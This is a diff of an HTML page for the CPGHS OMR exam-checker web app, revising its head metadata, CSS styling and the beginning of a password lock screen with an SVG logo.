@@ -3,560 +3,461 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>CPGHS OMR Scanner & Analytics</title>
-
-  <!-- PWA & iOS Safari App Support -->
-  <link rel="manifest" href="manifest.json" />
   <meta name="theme-color" content="#1e3a8a" />
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
-  <meta name="apple-mobile-web-app-title" content="CPGHS OMR" />
-
-  <!-- Chart.js, jsQR & OpenCV.js -->
+  <meta name="apple-mobile-web-app-title" content="CPGHS OMR Checker" />
+  <meta name="mobile-web-app-capable" content="yes" />
+  <title>CPGHS Optical Mark Recognition (OMR) Exam Checker</title>
+  <link id="dynamicManifestLink" rel="manifest" href="manifest.json" />
+  <link id="dynamicFaviconLink" rel="icon" type="image/png" />
+  <link id="dynamicAppleIconLink" rel="apple-touch-icon" sizes="512x512" />
   <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
-  <script async src="https://docs.opencv.org/4.8.0/opencv.js" onload="onOpenCvReady();"></script>
+  <script async src="https://docs.opencv.org/4.8.0/opencv.js" onload="onOpenCvReady()"></script>
 
   <style>
     :root {
-      --navy: #0f172a;
-      --blue: #1e3a8a;
-      --accent: #2563eb;
-      --green: #16a34a;
-      --red: #dc2626;
-      --amber: #d97706;
+      --primary: #1e3a8a;
+      --primary-dark: #0f172a;
+      --primary-light: #2563eb;
+      --accent: #0ea5e9;
+      --gold: #f59e0b;
+      --success: #16a34a;
+      --danger: #dc2626;
+      --warning: #d97706;
       --bg: #f1f5f9;
       --card: #ffffff;
+      --text: #0f172a;
+      --muted: #64748b;
+      --border: #cbd5e1;
     }
+    * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+    body { margin: 0; padding: 0 0 82px 0; background: var(--bg); color: var(--text); }
 
-    * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
-    body { margin: 0; background: var(--bg); color: var(--navy); padding-bottom: 78px; }
+    /* Shared Password Lock Overlay */
+    #pinLockScreen {
+      position: fixed; inset: 0;
+      background: radial-gradient(circle at top right, #1e40af 0%, #0f172a 75%);
+      z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;
+    }
+    .pin-card {
+      background: #ffffff; border-radius: 18px; padding: 24px 20px; width: 100%; max-width: 390px;
+      text-align: center; box-shadow: 0 24px 48px rgba(0,0,0,0.45); border-top: 5px solid var(--gold);
+    }
+    .pin-card h2 {
+      margin: 8px 0 6px 0; color: var(--primary); font-size: 17.5px; font-weight: 900;
+      border: none; padding: 0; line-height: 1.3;
+    }
+    .pin-card p { font-size: 12px; color: var(--muted); margin: 0 0 14px 0; line-height: 1.45; }
+    .pin-input {
+      width: 100%; padding: 12px; font-size: 18px; font-weight: 800; letter-spacing: 3px;
+      text-align: center; border: 2px solid var(--primary-light); border-radius: 10px; margin-bottom: 10px;
+    }
+    .pin-error { color: var(--danger); font-size: 12px; font-weight: 700; min-height: 18px; margin-bottom: 8px; }
 
-    header {
-      background: linear-gradient(135deg, #090d16 0%, #1e3a8a 65%, #1d4ed8 100%);
-      color: #fff;
-      padding: 12px 14px;
-      padding-top: max(12px, env(safe-area-inset-top));
-      position: sticky;
-      top: 0;
-      z-index: 50;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.18);
-      border-bottom: 1px solid rgba(255,255,255,0.12);
-    }
-    .header-top-row {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 10px;
-    }
-    .header-brand {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      min-width: 0;
-    }
-    .header-logo {
-      width: 42px;
-      height: 42px;
-      flex-shrink: 0;
-      border-radius: 10px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
-    }
-    header h1 { margin: 0; font-size: 14.5px; font-weight: 800; letter-spacing: 0.3px; line-height: 1.2; }
-    header p { margin: 2px 0 0 0; font-size: 10.5px; opacity: 0.85; }
-
-    .header-install-btn {
-      width: auto;
-      flex-shrink: 0;
-      background: linear-gradient(135deg, #22c55e, #16a34a);
-      color: #fff;
-      border: 1px solid rgba(255,255,255,0.28);
-      border-radius: 8px;
-      padding: 7px 10px;
-      font-size: 11px;
-      font-weight: 800;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.25);
-      white-space: nowrap;
-    }
-
-    .header-badges {
-      display: flex;
-      gap: 6px;
-      flex-wrap: wrap;
-      margin-top: 7px;
-    }
-
-    .badge-status {
-      display: inline-block;
-      font-size: 10px;
-      padding: 2px 8px;
-      border-radius: 99px;
-      background: #eab308;
-      color: #000;
-      font-weight: 700;
-    }
-    .badge-status.ready { background: #22c55e; color: #fff; }
-    .badge-status.queue { background: #3b82f6; color: #fff; }
-    .badge-status.unsynced { background: #f97316; color: #fff; }
-
-    /* Workflow Step Strip */
-    .workflow-strip {
-      background: #ffffff;
-      border-bottom: 1px solid #cbd5e1;
-      padding: 8px 10px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      font-size: 11px;
-      font-weight: 800;
-      color: #475569;
-      flex-wrap: wrap;
-    }
-    .wf-step {
-      padding: 3px 8px;
-      border-radius: 99px;
-      background: #e2e8f0;
-      color: #334155;
-    }
-    .wf-step.active {
-      background: #1e3a8a;
-      color: #ffffff;
-    }
-
-    .view { display: none; padding: 14px; max-width: 820px; margin: 0 auto; }
-    .view.active { display: block; }
-
-    .card {
-      background: var(--card);
-      border: 1px solid #e2e8f0;
-      border-radius: 12px;
-      padding: 16px;
-      margin-bottom: 12px;
-      box-shadow: 0 4px 14px rgba(15, 23, 42, 0.05);
-    }
-    .card h2 {
-      margin: 0 0 12px 0;
-      font-size: 14.5px;
-      font-weight: 800;
-      letter-spacing: 0.2px;
-      color: #0f172a;
-      border-bottom: 1.5px solid #e2e8f0;
-      padding-bottom: 8px;
-    }
-
-    label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 4px; color: #334155; }
-    input, select, textarea {
-      width: 100%;
-      padding: 9px 10px;
-      border: 1px solid #cbd5e1;
-      border-radius: 6px;
-      font-size: 14px;
-      margin-bottom: 10px;
-      background: #fff;
-    }
-
-    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-    .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; }
-
-    button {
-      width: 100%;
-      padding: 11px;
-      border: none;
-      border-radius: 7px;
-      font-weight: 700;
-      font-size: 13.5px;
-      cursor: pointer;
-      transition: opacity 0.2s;
-    }
-    button:active { opacity: 0.85; }
-    button:disabled { opacity: 0.6; cursor: not-allowed; }
-    .btn-primary { background: var(--accent); color: #fff; }
-    .btn-success { background: var(--green); color: #fff; }
-    .btn-danger  { background: var(--red); color: #fff; }
-    .btn-amber   { background: var(--amber); color: #fff; }
-    .btn-outline { background: #e2e8f0; color: var(--navy); }
-    .btn-sm { width: auto; padding: 5px 10px; font-size: 11.5px; }
-
-    /* TOS Competency Rows */
-    .tos-comp-row {
-      display: grid;
-      grid-template-columns: 2.2fr 1fr auto;
-      gap: 6px;
-      align-items: center;
-      margin-bottom: 6px;
-    }
-    .tos-comp-row input { margin-bottom: 0; font-size: 13px; padding: 8px; }
-    .btn-del-row {
-      width: auto;
-      background: var(--red);
-      color: #fff;
-      padding: 8px 10px;
-      border-radius: 6px;
-      font-size: 12px;
-    }
-
-    .camera-wrapper {
-      position: relative;
-      width: 100%;
-      aspect-ratio: 3 / 4;
-      background: #000;
-      border-radius: 10px;
-      overflow: hidden;
-      margin-bottom: 10px;
-    }
-    #resultCanvas, #cornerPinCanvas {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      display: none;
-      object-fit: contain;
-      background: #0f172a;
-    }
-    #cornerPinCanvas { touch-action: none; cursor: crosshair; z-index: 15; }
-    .review-controls {
-      display: none;
-      background: #eff6ff;
-      border: 1.5px solid #93c5fd;
-      border-radius: 8px;
-      padding: 10px;
-      margin-top: 8px;
-    }
-    .review-controls-title {
-      font-size: 12px;
-      font-weight: 800;
-      color: #1e3a8a;
-      margin-bottom: 6px;
-      text-align: center;
-    }
-
-    .scan-hud {
-      position: absolute;
-      bottom: 10px; left: 10px; right: 10px;
-      background: rgba(15, 23, 42, 0.9);
-      color: #fff;
-      padding: 8px 12px;
-      border-radius: 6px;
-      font-size: 12px;
-      text-align: center;
-      font-weight: 600;
-    }
-
-    /* Duplicate Warning Banner */
-    .dup-banner {
-      display: none;
-      background: #fffbeb;
-      border: 2px solid var(--amber);
-      border-radius: 8px;
-      padding: 12px;
-      margin-top: 10px;
-      text-align: center;
-    }
-    .dup-title { font-size: 14px; font-weight: 900; color: #92400e; margin-bottom: 4px; }
-    .dup-desc { font-size: 12px; color: #78350f; margin-bottom: 10px; }
-
-    .score-banner {
-      display: none;
-      background: #f0fdf4;
-      border: 2px solid var(--green);
-      border-radius: 8px;
-      padding: 12px;
-      margin-top: 10px;
-      text-align: center;
-    }
-    .score-big { font-size: 28px; font-weight: 900; color: var(--green); }
-    .legend-row {
-      display: flex;
-      justify-content: center;
-      gap: 14px;
-      flex-wrap: wrap;
-      font-size: 11px;
-      font-weight: 700;
-      color: #e2e8f0;
-      margin-top: 6px;
-    }
-    .dot-green { display: inline-block; width: 10px; height: 10px; border-radius: 50%; border: 2.5px solid #22c55e; vertical-align: middle; margin-right: 4px; }
-    .dot-red { display: inline-block; width: 10px; height: 10px; border-radius: 50%; border: 2.5px solid #ef4444; vertical-align: middle; margin-right: 4px; }
-    .dot-key { display: inline-block; width: 10px; height: 10px; border-radius: 50%; border: 2px dashed #22c55e; vertical-align: middle; margin-right: 4px; }
-    .drive-status-pill {
-      font-size: 11.5px;
-      font-weight: 700;
-      padding: 6px 10px;
-      border-radius: 6px;
-      background: #eff6ff;
-      color: #1e3a8a;
-      border: 1px solid #bfdbfe;
-      margin-top: 6px;
-      word-break: break-word;
-    }
-    .detected-student-info {
-      font-size: 13px;
-      font-weight: 700;
-      color: #0f172a;
-      background: #dcfce7;
-      padding: 6px 10px;
-      border-radius: 6px;
-      margin-bottom: 6px;
-    }
-
-    /* Local Scan History List */
-    .history-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 6px;
-      margin-bottom: 8px;
-    }
-    .history-actions {
-      display: flex;
-      gap: 6px;
-      flex-wrap: wrap;
-    }
-    .pill-synced { background: #dcfce7; color: #166534; padding: 2px 6px; border-radius: 4px; font-weight: 700; font-size: 10px; }
-    .pill-pending { background: #ffedd5; color: #9a3412; padding: 2px 6px; border-radius: 4px; font-weight: 700; font-size: 10px; }
-    .pill-bad { background: #fee2e2; color: #991b1b; padding: 2px 6px; border-radius: 4px; font-weight: 700; font-size: 10px; }
-    .pill-ok  { background: #dcfce7; color: #166534; padding: 2px 6px; border-radius: 4px; font-weight: 700; font-size: 10px; }
-
-    .kpi-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 12px; }
-    .kpi-box {
-      background: linear-gradient(180deg, #ffffff 0%, #f8fafc 100%);
-      border: 1px solid #cbd5e1;
-      border-top: 3px solid var(--accent);
-      border-radius: 10px;
-      padding: 10px 6px;
-      text-align: center;
-      box-shadow: 0 2px 6px rgba(15, 23, 42, 0.04);
-    }
-    .kpi-val { font-size: 19px; font-weight: 900; color: #0f172a; }
-    .kpi-lbl { font-size: 10px; color: #64748b; font-weight: 700; text-transform: uppercase; }
-
-    table { width: 100%; border-collapse: collapse; font-size: 12px; }
-    th, td { border: 1px solid #cbd5e1; padding: 6px 8px; text-align: left; }
-    th { background: #1e3a8a; color: #fff; }
-    tr:nth-child(even) { background: #f8fafc; }
-
-    nav.bottom-nav {
-      position: fixed;
-      bottom: 0; left: 0; right: 0;
-      padding-bottom: env(safe-area-inset-bottom);
-      height: calc(62px + env(safe-area-inset-bottom));
-      background: #fff;
-      border-top: 1px solid #cbd5e1;
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      z-index: 100;
-      box-shadow: 0 -2px 10px rgba(15, 23, 42, 0.06);
-    }
-    .nav-btn {
-      background: none;
-      border: none;
-      border-radius: 0;
-      color: #64748b;
-      font-size: 11px;
-      font-weight: 700;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 3px;
-      padding: 4px;
-    }
-    .nav-btn.active { color: var(--blue); border-top: 3px solid var(--blue); }
-    .nav-icon { font-size: 18px; }
-
-    /* Centered Modal Dialog */
+    /* Center Notification Modal & Duplicate Caution Modal */
     .center-modal-backdrop {
-      position: fixed;
-      inset: 0;
-      background: rgba(9, 13, 22, 0.72);
-      backdrop-filter: blur(4px);
-      -webkit-backdrop-filter: blur(4px);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      padding: 18px;
+      position: fixed; inset: 0; background: rgba(15, 23, 42, 0.78); z-index: 9998;
+      display: none; align-items: center; justify-content: center; padding: 18px;
+      backdrop-filter: blur(2px);
     }
     .center-modal-backdrop.open { display: flex; }
     .center-modal-box {
-      background: #ffffff;
-      width: 100%;
-      max-width: 390px;
-      border-radius: 14px;
-      padding: 20px 18px;
-      box-shadow: 0 20px 45px rgba(0, 0, 0, 0.35);
-      text-align: center;
-      border-top: 5px solid #2563eb;
+      background: #ffffff; border-radius: 16px; padding: 22px 20px; width: 100%; max-width: 410px;
+      box-shadow: 0 22px 44px rgba(0,0,0,0.38); text-align: center; border-top: 6px solid var(--primary);
       animation: modalPop 0.18s ease-out;
     }
-    .center-modal-box.warning { border-top-color: #d97706; }
-    .center-modal-box.danger  { border-top-color: #dc2626; }
-    .center-modal-box.success { border-top-color: #16a34a; }
     @keyframes modalPop {
-      from { transform: scale(0.92); opacity: 0; }
-      to   { transform: scale(1); opacity: 1; }
+      from { transform: scale(0.94); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
     }
-    .center-modal-icon { font-size: 32px; margin-bottom: 6px; }
-    .center-modal-title { font-size: 16px; font-weight: 900; color: #0f172a; margin-bottom: 6px; }
-    .center-modal-msg { font-size: 13px; color: #475569; line-height: 1.45; margin-bottom: 16px; }
-    .center-modal-actions { display: flex; gap: 8px; justify-content: center; }
+    .center-modal-box.warning { border-top-color: var(--warning); }
+    .center-modal-box.danger { border-top-color: var(--danger); }
+    .center-modal-box.success { border-top-color: var(--success); }
+    .center-modal-icon { font-size: 34px; margin-bottom: 6px; }
+    .center-modal-title { font-size: 16.5px; font-weight: 900; color: var(--text); margin-bottom: 6px; }
+    .center-modal-msg { font-size: 13px; color: #334155; line-height: 1.5; margin-bottom: 16px; white-space: pre-line; }
 
-    /* Universal Password & Encrypted Admin Lock Screen */
-    .pin-lock-screen {
-      position: fixed;
-      inset: 0;
-      background: linear-gradient(145deg, #090d16 0%, #1e3a8a 100%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 10000;
-      padding: 20px;
+    /* Header & Workflow Bar */
+    header {
+      background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 55%, #1d4ed8 100%);
+      color: #fff; padding: 10px 14px; display: flex; justify-content: space-between;
+      align-items: center; gap: 10px; position: sticky; top: 0; z-index: 50;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.22);
     }
-    .pin-lock-card {
-      background: #ffffff;
-      width: 100%;
-      max-width: 365px;
-      border-radius: 16px;
-      padding: 24px 20px;
-      box-shadow: 0 24px 50px rgba(0,0,0,0.45);
-      text-align: center;
+    .brand-wrap { display: flex; align-items: center; gap: 10px; min-width: 0; }
+    .brand-logo-svg { flex-shrink: 0; filter: drop-shadow(0 2px 5px rgba(0,0,0,0.35)); }
+    header h1 {
+      margin: 0; font-size: 13.5px; font-weight: 900; letter-spacing: 0.15px; line-height: 1.25;
     }
-    .pin-input-field {
-      font-size: 18px;
-      font-weight: 800;
-      letter-spacing: 3px;
-      text-align: center;
-      padding: 12px;
-      border: 2px solid #cbd5e1;
-      border-radius: 10px;
-      margin: 12px 0;
+    header .sub { font-size: 10.5px; opacity: 0.9; display: block; margin-top: 2px; color: #bae6fd; }
+    .header-actions { display: flex; gap: 6px; align-items: center; flex-shrink: 0; }
+    .badge {
+      background: rgba(255,255,255,0.16); padding: 4px 8px; border-radius: 999px;
+      font-size: 10.5px; font-weight: 700; white-space: nowrap;
     }
+    .install-btn {
+      background: linear-gradient(135deg, #f59e0b, #d97706); color: #fff; border: none;
+      border-radius: 999px; padding: 6px 11px; font-size: 11px; font-weight: 900;
+      cursor: pointer; width: auto; box-shadow: 0 2px 6px rgba(245, 158, 11, 0.4);
+    }
+
+    .workflow-bar {
+      display: flex; background: #e2e8f0; padding: 6px 10px; gap: 6px;
+      justify-content: space-between; border-bottom: 1px solid var(--border);
+    }
+    .wf-step {
+      flex: 1; text-align: center; font-size: 10.5px; font-weight: 800; padding: 6px 4px;
+      border-radius: 7px; color: #475569; background: #f8fafc; border: 1px solid #cbd5e1;
+      cursor: pointer;
+    }
+    .wf-step.active { background: #dbeafe; color: var(--primary); border-color: var(--primary-light); }
+
+    /* Views & Cards */
+    .view { display: none; padding: 12px; max-width: 960px; margin: 0 auto; }
+    .view.active { display: block; }
+    .card {
+      background: var(--card); border-radius: 12px; padding: 14px; margin-bottom: 12px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.06); border: 1px solid #e2e8f0;
+    }
+    h2 {
+      font-size: 14.5px; margin: 0 0 10px 0; color: var(--primary);
+      border-bottom: 1px solid #e2e8f0; padding-bottom: 6px;
+    }
+
+    /* Form Controls & Buttons */
+    label { display: block; font-size: 11.5px; font-weight: 700; color: #334155; margin-bottom: 4px; }
+    input, select, textarea {
+      width: 100%; padding: 9px 10px; border: 1px solid var(--border); border-radius: 8px;
+      font-size: 13.5px; margin-bottom: 10px; background: #fff; color: var(--text);
+    }
+    input:focus, select:focus, textarea:focus { outline: none; border-color: var(--primary-light); }
+
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+    .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+    @media (max-width: 480px) {
+      .grid-2 { grid-template-columns: 1fr; }
+      .grid-3 { grid-template-columns: 1fr; }
+    }
+
+    button, .native-capture-box {
+      border: none; border-radius: 9px; padding: 11px 12px; font-size: 13.5px;
+      font-weight: 800; cursor: pointer; width: 100%; display: inline-flex;
+      align-items: center; justify-content: center; gap: 6px; transition: opacity 0.15s;
+      text-align: center; user-select: none; position: relative; overflow: hidden;
+    }
+    button:active, .native-capture-box:active { opacity: 0.85; }
+    .btn-primary { background: var(--primary-light); color: #fff; }
+    .btn-success { background: var(--success); color: #fff; }
+    .btn-danger  { background: var(--danger); color: #fff; }
+    .btn-amber   { background: var(--warning); color: #fff; }
+    .btn-outline { background: #fff; border: 1.5px solid var(--primary-light); color: var(--primary); }
+    .btn-sm { padding: 7px 9px; font-size: 12px; border-radius: 7px; }
+
+    /* Direct Transparent File Input Overlay (Works reliably on iOS Safari & Android Chrome) */
+    .native-file-overlay {
+      position: absolute; inset: 0; width: 100%; height: 100%;
+      opacity: 0; cursor: pointer; z-index: 2; font-size: 100px;
+    }
+
+    /* Photo Capture Stage */
+    .camera-wrapper {
+      position: relative; width: 100%; background: #0f172a; border-radius: 10px;
+      overflow: hidden; min-height: 240px; display: none;
+      align-items: center; justify-content: center; border: 2px solid #1e293b;
+      margin-top: 8px;
+    }
+    .camera-wrapper.active { display: flex; flex-direction: column; }
+    #cornerPinCanvas, #resultCanvas {
+      width: 100%; height: auto; display: block; touch-action: none;
+    }
+    #cornerPinCanvas { display: none; cursor: crosshair; }
+    .scan-hud {
+      position: absolute; bottom: 8px; left: 8px; right: 8px;
+      background: rgba(15, 23, 42, 0.88); color: #fff; padding: 7px 10px;
+      border-radius: 8px; font-size: 11.5px; text-align: center; font-weight: 700;
+      pointer-events: none;
+    }
+
+    /* Corner Pin & Review Bar */
+    .review-controls {
+      display: none; background: #f8fafc; border: 1px solid var(--border);
+      border-radius: 10px; padding: 10px; margin-top: 8px;
+    }
+    .review-controls.open { display: block; }
+    .review-controls-title {
+      font-size: 11.5px; font-weight: 700; color: #334155; text-align: center; margin-bottom: 8px;
+    }
+
+    /* Save Destination Box (Phone Gallery vs Folder Path) */
+    .save-dest-card {
+      background: #ffffff; border: 1.5px solid #93c5fd; border-radius: 10px;
+      padding: 10px; margin-top: 10px; text-align: left;
+    }
+    .save-dest-title {
+      font-size: 12px; font-weight: 900; color: var(--primary); margin-bottom: 8px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .dest-option-row {
+      display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 8px;
+    }
+    @media (max-width: 480px) { .dest-option-row { grid-template-columns: 1fr; } }
+    .dest-radio-pill {
+      display: flex; align-items: center; gap: 8px; padding: 9px 10px;
+      border: 1.5px solid #cbd5e1; border-radius: 8px; background: #f8fafc;
+      cursor: pointer; font-size: 12.5px; font-weight: 800; color: #1e293b;
+      margin: 0;
+    }
+    .dest-radio-pill.selected {
+      border-color: var(--primary-light); background: #eff6ff; color: var(--primary);
+    }
+    .dest-radio-pill input[type="radio"] {
+      width: auto; margin: 0; accent-color: var(--primary-light);
+    }
+    .folder-path-panel {
+      display: none; background: #f8fafc; border: 1px dashed #64748b;
+      border-radius: 8px; padding: 9px; margin-top: 6px;
+    }
+    .folder-path-panel.open { display: block; }
+    .path-input-group {
+      display: flex; gap: 6px; align-items: stretch; margin-bottom: 6px;
+    }
+    .path-input-group input {
+      margin-bottom: 0; font-family: Consolas, monospace; font-size: 12px;
+    }
+    .path-action-btn {
+      width: auto; white-space: nowrap; padding: 8px 11px; font-size: 12px;
+    }
+
+    /* Graded Score Banner */
+    .score-banner {
+      display: none; background: #f0fdf4; border: 2px solid var(--success);
+      border-radius: 10px; padding: 12px; margin-top: 10px; text-align: center;
+    }
+    .score-banner.open { display: block; }
+    .score-banner.no-key { background: #eff6ff; border-color: var(--primary-light); }
+    .detected-student-info {
+      font-size: 13px; font-weight: 900; color: var(--primary); margin-bottom: 4px;
+    }
+    .score-big { font-size: 26px; font-weight: 900; color: var(--success); margin: 4px 0; }
+    .legend-row {
+      display: flex; justify-content: center; gap: 12px; flex-wrap: wrap;
+      font-size: 11px; color: #f8fafc; font-weight: 700;
+    }
+    .dot-green, .dot-red, .dot-key {
+      display: inline-block; width: 9px; height: 9px; border-radius: 50%; margin-right: 4px;
+    }
+    .dot-green { background: #22c55e; }
+    .dot-red   { background: #ef4444; }
+    .dot-key   { background: #38bdf8; }
+    .drive-status-pill {
+      margin-top: 8px; font-size: 11.5px; font-weight: 700; color: #1e3a8a;
+      background: #dbeafe; padding: 7px 10px; border-radius: 6px; line-height: 1.4;
+      white-space: pre-line;
+    }
+
+    /* Tables & KPIs */
+    .history-header {
+      display: flex; justify-content: space-between; align-items: center;
+      flex-wrap: wrap; gap: 8px; margin-bottom: 8px;
+    }
+    .history-actions { display: flex; gap: 6px; flex-wrap: wrap; }
+    table { width: 100%; border-collapse: collapse; font-size: 11.5px; }
+    th, td { border-bottom: 1px solid #e2e8f0; padding: 7px 6px; text-align: left; }
+    th { background: #f8fafc; color: var(--primary); font-weight: 800; position: sticky; top: 0; }
+
+    .kpi-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 8px; }
+    @media (max-width: 520px) { .kpi-grid { grid-template-columns: repeat(2, 1fr); } }
+    .kpi-box {
+      background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px;
+      padding: 10px 8px; text-align: center;
+    }
+    .kpi-val { font-size: 20px; font-weight: 900; color: var(--primary); }
+    .kpi-lbl { font-size: 11px; color: var(--muted); font-weight: 700; margin-top: 2px; }
+
+    /* TOS Competency Row */
+    .tos-row {
+      display: grid; grid-template-columns: 95px 1fr 110px 34px; gap: 6px;
+      margin-bottom: 6px; align-items: center;
+    }
+    .tos-row input { margin-bottom: 0; font-size: 12px; padding: 7px 8px; }
+    @media (max-width: 520px) { .tos-row { grid-template-columns: 1fr; } }
+
+    /* Admin Gate */
     .admin-gate-box {
-      background: #fffbeb;
-      border: 1.5px solid #f59e0b;
-      border-radius: 10px;
-      padding: 16px;
-      text-align: center;
+      background: #fffbeb; border: 1.5px solid #fcd34d; border-radius: 10px;
+      padding: 16px; text-align: center;
     }
+
+    /* Bottom Navigation */
+    .bottom-nav {
+      position: fixed; bottom: 0; left: 0; right: 0; background: #ffffff;
+      border-top: 1px solid var(--border); display: flex; z-index: 60;
+      box-shadow: 0 -2px 10px rgba(0,0,0,0.06);
+    }
+    .nav-btn {
+      flex: 1; background: transparent; color: var(--muted); border-radius: 0;
+      padding: 8px 4px; font-size: 11px; flex-direction: column; gap: 2px;
+    }
+    .nav-btn.active { color: var(--primary); background: #eff6ff; border-top: 3px solid var(--primary); }
+    .nav-icon { font-size: 17px; }
   </style>
 </head>
 <body>
 
-<!-- Universal Password Lock Screen (Redirects to Tab 1: TOS / Keys after Unlock) -->
-<div id="pinLockScreen" class="pin-lock-screen">
-  <div class="pin-lock-card">
-    <div style="margin-bottom:8px;">
-      <svg width="56" height="56" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+<!-- ==========================================================================
+     SHARED PASSWORD LOCK OVERLAY WITH UNIQUE BESPOKE OMR LOGO
+     ========================================================================== -->
+<div id="pinLockScreen">
+  <div class="pin-card">
+    <div style="display:flex; justify-content:center; margin-bottom:4px;">
+      <!-- Bespoke CPGHS OMR Exam Checker Vector Emblem -->
+      <svg width="76" height="76" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg" aria-label="CPGHS OMR Logo">
         <defs>
-          <linearGradient id="shieldGradLogin" x1="0" y1="0" x2="64" y2="64" gradientUnits="userSpaceOnUse">
+          <linearGradient id="shieldGradLock" x1="0%" y1="0%" x2="100%" y2="100%">
             <stop offset="0%" stop-color="#0f172a"/>
-            <stop offset="100%" stop-color="#1d4ed8"/>
-          </linearGradient>
-        </defs>
-        <path d="M32 4L56 13V31C56 46.5 45.8 56.8 32 61C18.2 56.8 8 46.5 8 31V13L32 4Z" fill="url(#shieldGradLogin)" stroke="#facc15" stroke-width="2.5"/>
-        <rect x="20" y="17" width="24" height="29" rx="3" fill="#ffffff"/>
-        <circle cx="25.5" cy="23" r="2.2" fill="#22c55e"/>
-        <rect x="30" y="21.5" width="10" height="3" rx="1.5" fill="#1e3a8a"/>
-        <circle cx="25.5" cy="30.5" r="2.2" fill="#cbd5e1"/>
-        <circle cx="32" cy="30.5" r="2.2" fill="#22c55e"/>
-        <circle cx="38.5" cy="30.5" r="2.2" fill="#cbd5e1"/>
-        <circle cx="25.5" cy="38" r="2.2" fill="#22c55e"/>
-        <rect x="30" y="36.5" width="10" height="3" rx="1.5" fill="#1e3a8a"/>
-        <line x1="15" y1="30.5" x2="49" y2="30.5" stroke="#ef4444" stroke-width="2" stroke-linecap="round"/>
-      </svg>
-    </div>
-    <div style="font-size:16px; font-weight:900; color:#0f172a;">CPGHS OMR SYSTEM</div>
-    <div style="font-size:11.5px; color:#64748b; margin-top:3px;">Enter the shared CPGHS User Password to start</div>
-    <input type="password" id="pinUnlockInput" class="pin-input-field" placeholder="Enter User Password" onkeydown="if(event.key==='Enter') verifySharedUserPassword()" />
-    <div id="pinErrorMsg" style="font-size:12px; font-weight:700; color:#dc2626; min-height:18px; margin-bottom:8px;"></div>
-    <button type="button" class="btn-primary" style="padding:12px; font-size:14px;" onclick="verifySharedUserPassword()">🔓 Unlock &amp; Go to TOS / Keys</button>
-    <div style="font-size:10.5px; color:#94a3b8; margin-top:10px;">SHA-256 Encrypted • Developer / Admin Controlled</div>
-  </div>
-</div>
-
-<!-- Centered Dialog / Message Modal -->
-<div id="centerModalBackdrop" class="center-modal-backdrop" role="dialog" aria-modal="true">
-  <div id="centerModalBox" class="center-modal-box">
-    <div id="centerModalIcon" class="center-modal-icon">ℹ️</div>
-    <div id="centerModalTitle" class="center-modal-title">Notice</div>
-    <div id="centerModalMsg" class="center-modal-msg">Message</div>
-    <div id="centerModalActions" class="center-modal-actions">
-      <button type="button" id="centerModalOkBtn" class="btn-primary" onclick="closeCenterModal()">OK</button>
-    </div>
-  </div>
-</div>
-
-<header>
-  <div class="header-top-row">
-    <div class="header-brand">
-      <svg class="header-logo" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="CPGHS OMR Logo">
-        <defs>
-          <linearGradient id="shieldGradHeader" x1="0" y1="0" x2="64" y2="64" gradientUnits="userSpaceOnUse">
-            <stop offset="0%" stop-color="#0f172a"/>
+            <stop offset="50%" stop-color="#1e3a8a"/>
             <stop offset="100%" stop-color="#2563eb"/>
           </linearGradient>
+          <linearGradient id="goldRimLock" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" stop-color="#fde047"/>
+            <stop offset="50%" stop-color="#f59e0b"/>
+            <stop offset="100%" stop-color="#b45309"/>
+          </linearGradient>
+          <linearGradient id="laserGlowLock" x1="0%" y1="0%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#38bdf8" stop-opacity="0.15"/>
+            <stop offset="50%" stop-color="#38bdf8" stop-opacity="1"/>
+            <stop offset="100%" stop-color="#38bdf8" stop-opacity="0.15"/>
+          </linearGradient>
         </defs>
-        <rect width="64" height="64" rx="14" fill="#090d16"/>
